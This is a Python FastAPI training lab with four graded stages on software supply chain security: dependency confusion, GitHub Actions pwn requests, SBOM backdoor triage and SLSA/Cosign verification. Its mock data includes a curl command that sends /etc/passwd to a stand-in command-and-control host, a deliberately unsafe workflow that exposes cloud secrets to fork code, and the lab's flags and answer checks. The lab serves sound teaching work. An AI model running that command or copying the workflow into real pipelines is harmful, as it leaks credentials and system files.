#!/usr/bin/env python3
"""
Lab 41: SupplyChainShield — Software Supply Chain Security & SBOM Lab
Interactive FastAPI service demonstrating enterprise software supply chain security:
1. Dependency Confusion & Typosquatting (Private vs Public PyPI/NPM Precedence & Hash Pinning)
2. CI/CD Runner Poisoning & Pwn Request (pull_request_target & Secret Exfiltration)
3. SBOM Vulnerability Triage (CycloneDX/SPDX Backdoor Carving & Hash Tamper Detection)
4. SLSA Level 3 & Sigstore Cosign Attestation (Cryptographic Provenance & Rekor Transparency)
"""

from typing import Dict, Any, List, Optional
import os
import hashlib
import json
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, Field

app = FastAPI(
    title="Lab 41: SupplyChainShield — Software Supply Chain Security & SBOM Lab",
    description="Hands-on enterprise software supply chain security simulation covering Dependency Confusion, CI/CD Runner Poisoning, CycloneDX SBOM analysis, and SLSA Level 3 Cosign verification.",
    version="1.0.0",
)

# Flags
STAGE1_FLAG = "FLAG{supplychain_dependency_confusion_pypi_hijacked}"
STAGE2_FLAG = "FLAG{supplychain_pwn_request_actions_secret_leaked}"
STAGE3_FLAG = "FLAG{supplychain_sbom_cyclonedx_backdoor_isolated}"
STAGE4_FLAG = "FLAG{supplychain_slsa_cosign_hermetic_verified_100}"

# ============================================================================
# Simulation Data & In-Memory State
# ============================================================================

STATE = {
    "stage1_solved": False,
    "stage2_solved": False,
    "stage3_solved": False,
    "stage4_solved": False,
    "pinned_packages": [],
    "pipeline_hardened": False,
    "isolated_components": [],
    "attestation_verified": False,
}

MOCK_PACKAGES = [
    {
        "name": "corp-auth-core",
        "scope": "internal",
        "internal_version": "1.2.0",
        "internal_registry": "https://nexus.corp.internal/repository/pypi-internal/simple",
        "public_pypi_version": "99.0.0",
        "public_pypi_author": "evil_actor_42",
        "public_pypi_payload": "curl -X POST https://c2.evil-corp.net/exfil -d @/etc/passwd",
        "vulnerable_to": "dependency_confusion",
        "safe_defense": "scoped_registry_or_pinning",
    },
    {
        "name": "corp-billing-sdk",
        "scope": "internal",
        "internal_version": "2.4.1",
        "internal_registry": "https://nexus.corp.internal/repository/pypi-internal/simple",
        "public_pypi_version": None,
        "public_pypi_author": None,
        "vulnerable_to": None,
        "safe_defense": "scoped_registry",
    },
    {
        "name": "requsts",
        "scope": "public",
        "target_legit": "requests",
        "public_pypi_version": "2.31.1",
        "public_pypi_author": "typo_squatter",
        "vulnerable_to": "typosquatting",
        "safe_defense": "name_typo_inspection",
    },
    {
        "name": "fastapi",
        "scope": "public",
        "public_pypi_version": "0.104.1",
        "sha256": "4b6e82c5f11079d86a4ea2775f28c279a02936a282f6406dbd0e6d6c4a6b281f",
        "vulnerable_to": None,
        "safe_defense": "legitimate_package",
    },
]

MOCK_WORKFLOW_YAML = """name: Enterprise CI Pipeline
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test_and_build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      secrets: read
    steps:
      - name: Checkout Fork PR Code
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}

      - name: Run Untrusted Contributor Tests
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          npm install
          npm test
"""

MOCK_SBOM_CYCLONEDX = {
    "bomFormat": "CycloneDX",
    "specVersion": "1.6",
    "serialNumber": "urn:uuid:3e671687-395b-41f5-a30f-a58921a69b79",
    "version": 1,
    "metadata": {
        "timestamp": "2026-10-16T08:00:00Z",
        "tools": [{"vendor": "Anchore", "name": "syft", "version": "1.0.0"}],
        "component": {
            "name": "enterprise-web-gateway",
            "version": "4.2.0",
            "type": "application",
        },
    },
    "components": [
        {
            "name": "openssl",
            "version": "3.0.13",
            "purl": "pkg:deb/debian/openssl@3.0.13?arch=amd64",
            "hashes": [{"alg": "SHA-256", "content": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}],
            "status": "clean",
        },
        {
            "name": "liblzma-build-hook",
            "version": "5.6.1-patch1",
            "purl": "pkg:generic/liblzma-build-hook@5.6.1-patch1",
            "hashes": [{"alg": "SHA-256", "content": "badc0de0000000000000000000000000000000000000000000000000deadbeef"}],
            "cve": "CVE-2024-3094",
            "description": "Obfuscated M4 macro test file injects backdoor into sshd RSA_public_decrypt symbol lookup.",
            "status": "compromised",
        },
        {
            "name": "curl",
            "version": "8.5.0",
            "purl": "pkg:deb/debian/curl@8.5.0",
            "hashes": [{"alg": "SHA-256", "content": "7c4a8d09ca3762af61e59520943dc26494f8941b"},],
            "status": "clean",
        },
        {
            "name": "python-certifi",
            "version": "2024.07.04",
            "purl": "pkg:pypi/certifi@2024.07.04",
            "hashes": [{"alg": "SHA-256", "content": "8f88863f683e390c50b86a8397a7a13346f3d9d3"}],
            "status": "clean",
        },
    ],
}

MOCK_ATTESTATION = {
    "image_ref": "registry.corp.internal/prod/backend-api:v3.5.0",
    "image_digest": "sha256:4a8f9c12b7e53d0684a1e90f2b6c7d1e8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f",
    "cosign": {
        "signature_valid": True,
        "issuer": "https://token.actions.githubusercontent.com",
        "subject": "https://github.com/corp-org/backend-api/.github/workflows/build.yml@refs/heads/main",
        "rekor_log_index": 12894562,
        "rekor_bundle_verified": True,
    },
    "slsa_provenance": {
        "builder": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v1.9.0",
        "build_type": "https://slsa.dev/container-based-build/v0.1?draft",
        "slsa_level": "SLSA_BUILD_LEVEL_3",
        "hermetic": True,
        "parameters": {
            "source": "git+https://github.com/corp-org/backend-api@commit:9f8a7b6c5d4e3f2a1b0c",
            "entrypoint": "docker build --no-cache -t $IMAGE .",
        },
    },
}

# ============================================================================
# Pydantic Request Models
# ============================================================================

class Stage1ResolveRequest(BaseModel):
    target_package: str = Field(..., description="Target package name subject to attack")
    vulnerability_type: str = Field(..., description="Identified vulnerability type: dependency_confusion or typosquatting")
    defense_strategy: str = Field(..., description="Mitigation: scoped_registry_or_pinning or name_typo_inspection")

class Stage2AuditRequest(BaseModel):
    trigger_hazard: str = Field(..., description="Trigger hazard event, e.g., pull_request_target")
    leaked_secret: str = Field(..., description="Exfiltrated secret credential name")
    recommended_fix: str = Field(..., description="Security fix: pull_request_read_only or separate_workflow")

class Stage3SbomTriageRequest(BaseModel):
    compromised_component: str = Field(..., description="Backdoored component name in SBOM")
    cve_id: str = Field(..., description="Associated vulnerability CVE identifier")
    hash_mismatch: bool = Field(..., description="Whether cryptographic hash mismatch was identified")
    action: str = Field(..., description="Action to take: isolate_component")

class Stage4VerifyRequest(BaseModel):
    image_digest: str = Field(..., description="Target image sha256 digest")
    issuer_oidc: str = Field(..., description="Trusted OIDC identity issuer")
    slsa_level: str = Field(..., description="Required SLSA level, e.g. SLSA_BUILD_LEVEL_3")
    enforce_policy: bool = Field(..., description="Enforce strict admission verification")

# ============================================================================
# FastAPI Endpoints
# ============================================================================

@app.get("/", response_class=HTMLResponse)
def index_dashboard():
    """Renders interactive Lab 41 web dashboard."""
    html_content = """<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>Lab 41: SupplyChainShield — Software Supply Chain Security Lab</title>
  <style>
    body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; margin: 0; padding: 24px; }
    h1 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 12px; }
    .badge { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; background: #238636; color: #fff; }
    .card { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin-bottom: 18px; }
    pre { background: #090c10; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
    .btn { background: #238636; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: bold; }
    .btn:hover { background: #2ea043; }
    .stage-title { font-size: 16px; font-weight: bold; color: #f0883e; margin-bottom: 8px; }
  </style>
</head>
<body>
  <h1>📦 Lab 41: SupplyChainShield <span class="badge">Port: 8041</span></h1>
  <p>엔터프라이즈 소프트웨어 공급망 보안, Dependency Confusion, CI/CD 러너 하이재킹, CycloneDX SBOM 역추적, SLSA Level 3 & Cosign 증명 검증 실전 랩입니다.</p>

  <div class="card">
    <div class="stage-title">Stage 1: Dependency Confusion & Typosquatting</div>
    <p>사내 비공개 패키지(corp-auth-core v1.2.0)와 공격자가 공개 PyPI에 올린 악성 패키지(v99.0.0) 간의 레지스트리 우선순위 하이재킹을 분석하고 스코핑/해시 피닝을 적용하세요.</p>
    <pre>POST /api/stage1/resolve</pre>
  </div>

  <div class="card">
    <div class="stage-title">Stage 2: Malicious CI/CD Runner Poisoning (Pwn Request)</div>
    <p>GitHub Actions <code>pull_request_target</code> 취약점을 통해 포크된 PR에서 러너 시크릿이 유출되는 경로를 진단하고 권한을 분리하세요.</p>
    <pre>POST /api/stage2/audit-pipeline</pre>
  </div>

  <div class="card">
    <div class="stage-title">Stage 3: SBOM Vulnerability Triage (CycloneDX / SPDX)</div>
    <p>CycloneDX 1.6 규격의 SBOM JSON 데이터를 파싱하여 xz-utils(CVE-2024-3094) 유사 M4 매크로 백도어 및 해시 변조 컴포넌트를 탐지하고 격리하세요.</p>
    <pre>POST /api/stage3/triage-sbom</pre>
  </div>

  <div class="card">
    <div class="stage-title">Stage 4: SLSA Level 3 & Sigstore Cosign Attestation Verification</div>
    <p>Sigstore Keyless OIDC 서명과 Rekor 투명성 로그, In-Toto SLSA Provenance를 감사하여 비인가 변조 아티팩트를 차단하고 빌드 무결성을 강제하세요.</p>
    <pre>POST /api/stage4/verify-provenance</pre>
  </div>
</body>
</html>
"""
    return HTMLResponse(content=html_content)

@app.get("/api/status")
def get_status():
    """Returns current completion status of Lab 41 stages."""
    all_done = (
        STATE["stage1_solved"]
        and STATE["stage2_solved"]
        and STATE["stage3_solved"]
        and STATE["stage4_solved"]
    )
    return {
        "lab": "41",
        "codename": "SupplyChainShield",
        "port": 8041,
        "all_stages_completed": all_done,
        "stages": {
            "stage1_dependency_confusion": STATE["stage1_solved"],
            "stage2_ci_pipeline_audit": STATE["stage2_solved"],
            "stage3_sbom_triage": STATE["stage3_solved"],
            "stage4_slsa_attestation": STATE["stage4_solved"],
        },
        "details": {
            "pinned_packages": STATE["pinned_packages"],
            "pipeline_hardened": STATE["pipeline_hardened"],
            "isolated_components": STATE["isolated_components"],
            "attestation_verified": STATE["attestation_verified"],
        },
    }

@app.post("/api/reset")
def reset_state():
    """Resets all stages in Lab 41."""
    STATE["stage1_solved"] = False
    STATE["stage2_solved"] = False
    STATE["stage3_solved"] = False
    STATE["stage4_solved"] = False
    STATE["pinned_packages"] = []
    STATE["pipeline_hardened"] = False
    STATE["isolated_components"] = []
    STATE["attestation_verified"] = False
    return {"status": "success", "message": "Lab 41 state has been reset to initial baseline."}

# ============================================================================
# Stage 1: Dependency Confusion & Typosquatting
# ============================================================================

@app.get("/api/stage1/packages")
def get_packages():
    """Returns list of internal and public packages with version metadata."""
    return {"packages": MOCK_PACKAGES}

@app.post("/api/stage1/resolve")
def resolve_dependency_confusion(req: Stage1ResolveRequest):
    """Analyzes dependency confusion vulnerability and enforces scoped registry/pinning."""
    target = None
    for p in MOCK_PACKAGES:
        if p["name"] == req.target_package:
            target = p
            break

    if not target:
        raise HTTPException(status_code=400, detail=f"Package '{req.target_package}' not found in registry registry manifest.")

    if req.target_package == "corp-auth-core":
        if req.vulnerability_type != "dependency_confusion":
            raise HTTPException(
                status_code=400,
                detail=f"Incorrect vulnerability type '{req.vulnerability_type}'. The public PyPI package has a higher semantic version (99.0.0) overriding internal (1.2.0).",
            )
        if req.defense_strategy != "scoped_registry_or_pinning":
            raise HTTPException(
                status_code=400,
                detail="Defense strategy must be 'scoped_registry_or_pinning' (specifying --extra-index-url without scoping causes pip to prioritize highest version).",
            )
        STATE["stage1_solved"] = True
        STATE["pinned_packages"].append("corp-auth-core==1.2.0")
        return {
            "status": "success",
            "stage": 1,
            "message": "Dependency confusion vulnerability successfully resolved! Enforced internal scoped registry and strict sha256 hash pinning.",
            "flag": STAGE1_FLAG,
        }
    elif req.target_package == "requsts":
        if req.vulnerability_type != "typosquatting":
            raise HTTPException(status_code=400, detail="Identified as typosquatting attack against 'requests'.")
        return {
            "status": "info",
            "message": "Identified typosquatting against 'requests'. Focus on resolving 'corp-auth-core' dependency confusion to obtain the Stage 1 flag.",
        }
    else:
        raise HTTPException(status_code=400, detail=f"Package '{req.target_package}' is not the vulnerable target.")

# ============================================================================
# Stage 2: CI/CD Runner Poisoning & Pwn Request
# ============================================================================

@app.get("/api/stage2/workflow")
def get_workflow():
    """Returns the vulnerable GitHub Actions workflow definition."""
    return {
        "workflow_filename": ".github/workflows/ci.yml",
        "yaml_content": MOCK_WORKFLOW_YAML,
        "trigger": "pull_request_target",
        "high_privilege": True,
    }

@app.post("/api/stage2/audit-pipeline")
def audit_pipeline(req: Stage2AuditRequest):
    """Audits CI/CD pipeline hazard and isolates privileged secrets from untrusted PR code."""
    if req.trigger_hazard != "pull_request_target":
        raise HTTPException(
            status_code=400,
            detail=f"Trigger hazard '{req.trigger_hazard}' is incorrect. 'pull_request_target' runs with write permissions in repository context while checking out untrusted head code.",
        )
    if req.leaked_secret != "AWS_SECRET_ACCESS_KEY":
        raise HTTPException(
            status_code=400,
            detail=f"Secret '{req.leaked_secret}' is not the primary cloud credential exfiltrated by untrusted npm test execution.",
        )
    if req.recommended_fix != "pull_request_read_only":
        raise HTTPException(
            status_code=400,
            detail="Recommended fix must be 'pull_request_read_only' (switch to standard 'pull_request' trigger with read-only permissions and no repository secrets).",
        )

    STATE["stage2_solved"] = True
    STATE["pipeline_hardened"] = True
    return {
        "status": "success",
        "stage": 2,
        "message": "CI/CD Pipeline hardened! Switched untrusted forks to unprivileged read-only runner context. Cloud secrets secured.",
        "flag": STAGE2_FLAG,
    }

# ============================================================================
# Stage 3: SBOM Vulnerability Triage (CycloneDX / SPDX)
# ============================================================================

@app.get("/api/stage3/sbom")
def get_sbom():
    """Returns Software Bill of Materials (SBOM) in CycloneDX 1.6 format."""
    return {"sbom": MOCK_SBOM_CYCLONEDX}

@app.post("/api/stage3/triage-sbom")
def triage_sbom(req: Stage3SbomTriageRequest):
    """Parses CycloneDX SBOM, detects backdoored components, and isolates compromised artifacts."""
    if req.compromised_component != "liblzma-build-hook":
        raise HTTPException(
            status_code=400,
            detail=f"Component '{req.compromised_component}' is not the backdoored package in the SBOM tree.",
        )
    if req.cve_id != "CVE-2024-3094":
        raise HTTPException(
            status_code=400,
            detail=f"CVE identifier '{req.cve_id}' does not match the upstream supply chain backdoor vulnerability.",
        )
    if not req.hash_mismatch:
        raise HTTPException(
            status_code=400,
            detail="Cryptographic hash mismatch must be confirmed (upstream binary digest vs build artifact).",
        )
    if req.action != "isolate_component":
        raise HTTPException(
            status_code=400,
            detail="Action must be 'isolate_component' to quarantine the compromised build hook.",
        )

    STATE["stage3_solved"] = True
    STATE["isolated_components"].append("liblzma-build-hook@5.6.1-patch1")
    return {
        "status": "success",
        "stage": 3,
        "message": "SBOM triage complete! Backdoored M4 macro component isolated and removed from build graph.",
        "flag": STAGE3_FLAG,
    }

# ============================================================================
# Stage 4: SLSA Level 3 & Cosign Attestation Verification
# ============================================================================

@app.get("/api/stage4/attestation")
def get_attestation():
    """Returns container image cryptographic attestation and SLSA provenance."""
    return {"attestation": MOCK_ATTESTATION}

@app.post("/api/stage4/verify-provenance")
def verify_provenance(req: Stage4VerifyRequest):
    """Verifies Sigstore Cosign signature, Rekor transparency log, and enforces SLSA Level 3."""
    expected_digest = MOCK_ATTESTATION["image_digest"]
    if req.image_digest != expected_digest:
        raise HTTPException(
            status_code=400,
            detail=f"Image digest mismatch. Provided '{req.image_digest}', expected '{expected_digest}'.",
        )
    if req.issuer_oidc != "https://token.actions.githubusercontent.com":
        raise HTTPException(
            status_code=400,
            detail="Untrusted OIDC issuer. Must be 'https://token.actions.githubusercontent.com'.",
        )
    if req.slsa_level != "SLSA_BUILD_LEVEL_3":
        raise HTTPException(
            status_code=400,
            detail="SLSA build requirement must be 'SLSA_BUILD_LEVEL_3' (requiring hermetic, isolated build platform).",
        )
    if not req.enforce_policy:
        raise HTTPException(
            status_code=400,
            detail="Strict admission policy enforcement must be set to true.",
        )

    STATE["stage4_solved"] = True
    STATE["attestation_verified"] = True
    return {
        "status": "success",
        "stage": 4,
        "message": "SLSA Level 3 & Sigstore Cosign attestation verified! Container provenance cryptographically validated against Rekor transparency log.",
        "flag": STAGE4_FLAG,
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8041)
